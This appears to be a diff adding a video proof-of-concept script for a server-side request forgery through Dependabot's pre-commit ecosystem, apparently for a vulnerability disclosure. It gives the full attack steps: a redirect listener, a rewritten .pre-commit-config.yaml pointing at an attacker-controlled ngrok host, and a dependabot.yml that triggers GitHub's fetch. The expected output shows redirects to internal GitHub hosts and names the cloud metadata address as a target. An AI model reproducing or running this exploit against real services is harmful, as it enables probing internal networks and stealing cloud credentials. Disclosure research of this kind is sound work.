@@ -1,0 +1,85 @@
+============================================
+ VIDEO PoC — Dependabot SSRF via Pre-Commit
+============================================
+
+Open 3 terminal tabs + 1 browser tab. Start recording.
+
+============================================
+TAB 1 — Start the redirect server
+============================================
+
+python3 /home/hmz/mcp-ssrf-test/redirect_listener.py
+
+# Leave running. It prints every request live.
+
+============================================
+TAB 2 — Watch the log
+============================================
+
+> /tmp/dependabot-requests.log && tail -f /tmp/dependabot-requests.log
+
+============================================
+TAB 3 — Do the attack
+============================================
+
+# Run these one at a time:
+
+cd ~/hunt/pre-commit-test
+
+# 1. Show current clean config
+cat .pre-commit-config.yaml
+
+# 2. Replace with malicious config
+cat > .pre-commit-config.yaml << 'EOF'
+repos:
+  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/ssrf-test
+    rev: v5.0.0
+    hooks:
+      - id: ssrf-poc
+EOF
+
+# 3. Show malicious config
+cat .pre-commit-config.yaml
+
+# 4. Add dependabot.yml
+mkdir -p .github
+cat > .github/dependabot.yml << 'EOF'
+version: 2
+updates:
+  - package-ecosystem: "pre-commit"
+    directory: "/"
+    schedule:
+      interval: "daily"
+EOF
+
+# 5. Push
+git add -A && git commit -m "poc" && git push
+
+# 6. Wait ~60 seconds, switch to Tab 1 & Tab 2 to see requests
+
+============================================
+BROWSER — Show the repo
+============================================
+
+Open: https://github.com/0hmdz/pre-commit-test
+
+============================================
+WHAT TO EXPECT
+============================================
+
+Within ~60 seconds after push, Tab 1 and Tab 2 will show:
+
+  [HIT] GET /ssrf-test.git/info/refs?service=git-upload-pack
+    User-Agent: dependabot-core/0.367.0
+    X-Forwarded-For: <github-ip>
+  [REDIRECT] -> http://ssrf-target.iad.github.net/
+
+  [HIT] GET /ssrf-test.git/info/refs?service=git-upload-pack
+    User-Agent: git/2.53.0
+    X-Forwarded-For: <github-ip>
+  [REDIRECT] -> http://ssrf-target.iad.github.net/
+
+This proves:
+1. Dependabot fetches arbitrary URLs from .pre-commit-config.yaml
+2. Both dependabot-core and git follow HTTP 302 redirects
+3. Attacker can redirect to internal targets (ssrf-target.iad.github.net, 169.254.169.254, etc.)
